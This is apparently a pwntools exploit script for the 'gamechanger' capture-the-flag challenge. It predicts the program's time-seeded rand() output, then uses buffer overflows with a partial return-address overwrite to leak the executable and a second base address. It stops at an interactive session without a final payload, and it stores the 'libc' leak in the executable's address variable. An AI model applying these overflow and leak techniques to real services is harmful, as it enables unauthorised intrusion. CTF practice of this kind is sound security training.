#!/usr/bin/python3

from pwn import *
import ctypes
import time
exe = ELF('gamechanger', checksec=False)
libc = ctypes.CDLL('/usr/lib/x86_64-linux-gnu/libc.so.6')
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+222

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('ctf.tcp1p.com', 9254)
else:
        p = process(exe.path)

# GDB()
sla(b'(1: Yes, 0: No):', '1')
libc.srand(int(time.time()))
sla(b'1 and 100\n', str((libc.rand()+34) %23))
sa(b'morning?\n', b'a'*0x108 + p16(0x835a))
p.recvuntil(b'a'*0x108)
exe.address = u64(p.recvuntil(b'...', drop=True).ljust(8, b'\0'))
info("Exe base: " + hex(exe.address))

sa(b'morning?\n', b'a'*0x108 + p64(exe.address+1) + b'a'*0x10)
sa(b'morning?\n', b'a'*0x120)
p.recvuntil(b'a'*0x120)
exe.address = u64(p.recvuntil(b'...', drop=True).ljust(8, b'\0'))
info("Libc base: " + hex(exe.address))
p.interactive()
